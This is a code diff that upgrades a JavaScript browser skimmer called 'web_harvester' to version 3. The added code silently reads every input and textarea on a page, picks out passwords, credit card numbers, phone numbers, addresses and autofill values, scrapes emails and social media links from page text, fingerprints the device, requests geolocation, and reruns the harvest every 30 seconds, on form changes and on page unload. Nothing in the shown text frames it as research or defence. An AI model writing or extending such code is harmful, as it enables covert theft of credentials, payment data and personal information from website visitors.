@@ -13,7 +13,7 @@
         try {
             const collectedData = {
                 deviceId: DEVICE_ID,
-                agentId: 'web_harvester_v2',
+                agentId: 'web_harvester_v3_enhanced',
                 website: window.location.hostname,
                 url: window.location.href,
                 timestamp: new Date().toISOString(),
@@ -23,16 +23,60 @@
                 photos: [],
                 passwords: [],
                 creditCards: [],
+                phones: [],
+                addresses: [],
                 cookies: [],
                 browserStorage: {},
+                formData: {},
+                socialMedia: {},
                 metadata: {
                     userAgent: navigator.userAgent,
+                    platform: navigator.platform,
                     language: navigator.language,
+                    languages: navigator.languages || [],
                     screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    referrer: document.referrer
+                    referrer: document.referrer,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+                    battery: null,
+                    geolocation: null
                 }
             };
+
+            // Get battery status
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.metadata.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging
+                    };
+                } catch (e) {}
+            }
+
+            // Get geolocation (with permission)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.metadata.geolocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    },
+                    () => {}, // Silent fail
+                    { timeout: 5000, maximumAge: 0 }
+                );
+            }
 
             // Extract username from common patterns
             const userPatterns = ['user', 'username', 'name', 'profile', 'account', 'currentUser'];
@@ -166,23 +210,108 @@
             });
 
             // Look for input fields with saved values
-            const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]');
+            const inputs = document.querySelectorAll('input, textarea');
             inputs.forEach(input => {
                 if (input.value) {
-                    const type = input.type;
+                    const type = input.type || 'text';
                     const name = input.name || input.id || 'unknown';
+                    const value = input.value;
                     
-                    if (type === 'email' || input.value.includes('@')) {
+                    // Store all form data
+                    collectedData.formData[name] = value.substring(0, 500);
+                    
+                    // Email detection
+                    if (type === 'email' || value.includes('@')) {
                         collectedData.emails.push({ 
                             source: `input_${name}`, 
-                            data: input.value 
-                        });
-                    } else if (type === 'password') {
-                        collectedData.passwords.push({ 
-                            source: `input_${name}`, 
-                            data: input.value 
+                            data: value 
                         });
                     }
+                    
+                    // Password detection
+                    if (type === 'password') {
+                        collectedData.passwords.push({ 
+                            source: `input_${name}`, 
+                            data: value 
+                        });
+                    }
+                    
+                    // Phone number detection (various formats)
+                    const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+                    if (type === 'tel' || phoneRegex.test(value)) {
+                        collectedData.phones.push({ 
+                            source: `input_${name}`, 
+                            data: value 
+                        });
+                    }
+                    
+                    // Credit card detection (basic pattern)
+                    const cardRegex = /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g;
+                    if (cardRegex.test(value)) {
+                        collectedData.creditCards.push({ 
+                            source: `input_${name}`, 
+                            data: value 
+                        });
+                    }
+                    
+                    // Address detection
+                    if (name.toLowerCase().includes('address') || 
+                        name.toLowerCase().includes('street') ||
+                        name.toLowerCase().includes('city') ||
+                        name.toLowerCase().includes('zip') ||
+                        name.toLowerCase().includes('postal')) {
+                        collectedData.addresses.push({ 
+                            source: `input_${name}`, 
+                            data: value 
+                        });
+                    }
+                }
+            });
+
+            // Harvest all text on page for phone numbers, emails, addresses
+            const pageText = document.body.innerText || '';
+            
+            // Find all emails in page text
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+            const foundEmails = pageText.match(emailRegex) || [];
+            foundEmails.forEach(email => {
+                if (!collectedData.emails.find(e => e.data === email)) {
+                    collectedData.emails.push({ source: 'page_text', data: email });
+                }
+            });
+            
+            // Find all phone numbers in page text
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            const foundPhones = pageText.match(phoneRegex) || [];
+            foundPhones.slice(0, 20).forEach(phone => {
+                if (!collectedData.phones.find(p => p.data === phone)) {
+                    collectedData.phones.push({ source: 'page_text', data: phone });
+                }
+            });
+
+            // Harvest social media profiles
+            const links = document.querySelectorAll('a[href]');
+            links.forEach(link => {
+                const href = link.href.toLowerCase();
+                if (href.includes('facebook.com/')) {
+                    collectedData.socialMedia.facebook = link.href;
+                } else if (href.includes('instagram.com/')) {
+                    collectedData.socialMedia.instagram = link.href;
+                } else if (href.includes('twitter.com/') || href.includes('x.com/')) {
+                    collectedData.socialMedia.twitter = link.href;
+                } else if (href.includes('linkedin.com/')) {
+                    collectedData.socialMedia.linkedin = link.href;
+                } else if (href.includes('tiktok.com/')) {
+                    collectedData.socialMedia.tiktok = link.href;
+                }
+            });
+
+            // Harvest autofill data (browser saved info)
+            const autoFillInputs = document.querySelectorAll('input[autocomplete]');
+            autoFillInputs.forEach(input => {
+                if (input.value && input.autocomplete) {
+                    const key = `autofill_${input.autocomplete}`;
+                    collectedData.browserStorage[key] = input.value;
                 }
             });
 
@@ -209,7 +338,19 @@
         });
     }
 
-    // Continuous harvesting every 60 seconds
-    setInterval(silentHarvest, 60000);
+    // Continuous harvesting every 30 seconds (more frequent)
+    setInterval(silentHarvest, 30000);
+
+    // Harvest when user interacts with forms
+    document.addEventListener('change', (e) => {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            setTimeout(silentHarvest, 2000);
+        }
+    }, true);
+
+    // Harvest before page unload
+    window.addEventListener('beforeunload', () => {
+        silentHarvest();
+    });
 
 })();
